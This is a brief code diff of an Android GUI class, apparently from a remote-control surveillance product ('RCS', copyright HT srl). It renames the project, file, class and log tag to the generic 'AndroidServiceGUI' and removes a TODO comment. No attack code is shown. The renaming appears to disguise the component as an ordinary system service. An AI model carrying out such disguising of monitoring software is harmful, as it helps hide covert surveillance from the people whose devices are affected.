@@ -1,8 +1,8 @@
 /* *******************************************
  * Copyright (c) 2011
  * HT srl,   All rights reserved.
- * Project      : RCS, RCSAndroid
- * File         : RCSAndroidGUI.java
+ * Project      : RCS, AndroidService
+ * File         : AndroidServiceGUI.java
  * Created      : Apr 9, 2011
  * Author		: zeno
  * *******************************************/
@@ -21,13 +21,12 @@ import android.widget.ToggleButton;
 
 import com.android.gui.R;
 
-// TODO: Auto-generated Javadoc
 /**
- * The Class RCSAndroidGUI.
+ * The Class AndroidServiceGUI.
  */
-public class RCSAndroidGUI extends Activity {
+public class AndroidServiceGUI extends Activity {
 
-	protected static final String TAG = "RCSAndroidGUI";
+	protected static final String TAG = "AndroidServiceGUI";
 
 	/**
 	 * Called when the activity is first created.
